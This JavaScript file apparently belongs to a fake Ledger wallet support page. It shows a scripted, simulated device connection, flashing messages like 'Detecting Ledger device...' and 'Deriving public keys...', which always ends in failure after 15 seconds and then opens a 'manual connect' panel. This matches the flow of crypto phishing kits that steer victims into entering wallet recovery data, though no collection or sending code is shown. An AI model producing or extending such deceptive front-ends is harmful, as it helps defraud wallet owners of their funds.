function toggleMenu(){
    const nav = document.querySelector('.nav-links');
    nav.classList.toggle('active');
}
function openOverlay(){
    document.getElementById('supportOverlay').classList.add('active');
    showFirstBox();
}

function showFirstBox(){
        hideAllBoxes();
    document.getElementById('glassBox1').classList.add('active');
}

function closeOverlay(){
     clearAllTimers();
    hideAllBoxes();
    document.getElementById('glassBox3').classList.remove('active');
    document.getElementById('supportOverlay').classList.remove('active');
    document.getElementById('glassBox5').classList.remove('active');
}

function opensecondBox(){
    document.getElementById('glassBox3').classList.remove('active');
    document.getElementById('glassBox2').classList.add('active');
    startConnectionSimulation();
    setTimeout(endConnectionSimulation, 15000);
}


const connectionTexts = [
    "Initializing secure connection...",
    "Detecting Ledger device...",
    "Waiting for device response...",
    "Establishing USB/bluetooth channel...",
    "Verifying secure element...",
    "Checking firmware version...",
    "Requesting user confirmation...",
    "Awaiting device unlock...",
    "Deriving public keys...",
    "Syncing wallet metadata...",
    "Validating cryptographic session...",
    "Finalizing secure handshake...",
];

let textInterval = null;
let connectionTimeout = null;
let connectionCompleted = false;

function startConnectionSimulation(){
    const textEl = document.getElementById('walletStatusText');
    let index = 0;
    connectionCompleted = false;

    clearAllTimers();


    textInterval = setInterval(() => {
        textEl.innerText = connectionTexts[index];
        index = (index + 1) % connectionTexts.length;
    }, 200);

    connectionTimeout = setTimeout(() => {
        clearInterval(textInterval);
        document.getElementById('glassBox2').classList.remove('active');
    }, 15000);
}

function hideAllBoxes(){
    document.getElementById('glassBox1').classList.remove('active');
    document.getElementById('glassBox2').classList.remove('active');
    document.getElementById('glassBox4').classList.remove('active')
}

function endConnectionSimulation(){
    clearInterval(textInterval);
    clearTimeout(connectionTimeout);

    document.getElementById('glassBox2').classList.remove('active');

    document.getElementById('glassBox3').classList.add('active');
}


function retryConnection(){
    opensecondBox();
}


function clearAllTimers(){
    clearInterval(textInterval);
    clearTimeout(connectionTimeout);
    textInterval = null;
    connectionTimeout = null;
}



function openManualConnect(){
    hideAllBoxes();
    document.getElementById('glassBox3').classList.remove('active');

    document.getElementById('glassBox4').classList.add('active');
}

